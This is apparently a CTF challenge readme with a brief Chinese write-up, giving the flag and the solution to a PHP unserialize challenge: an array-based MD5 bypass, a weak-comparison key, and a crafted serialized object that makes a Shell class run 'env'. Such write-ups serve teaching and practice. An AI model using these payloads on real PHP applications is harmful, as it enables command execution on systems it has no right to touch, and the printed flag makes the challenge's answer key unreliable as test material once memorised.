# Description
get the shell to hack the earth

# Difficulty
⭐⭐⭐⭐

# Flag
`mayctf{N0w_Y0u_m@y_Know_wh@t_1s_unserialize!}`

# Hint (Optional)
可能你需要些反序列化的知识

# WriteUp
简单审计源代码
## 考点
 - 利用数组绕过MD5验证 `addr1[]=1&addr2[]=2`
 - 弱类型比较`key=0`
 - 简单的类知识`__construct` 和 `__toString`魔术方法
 - 简单的构造序列化数据 `O:5:"Admin":1:{s:4:"name";O:5:"Shell":1:{s:3:"cmd";s:3:"env";}}` 由`genSerial.php`生成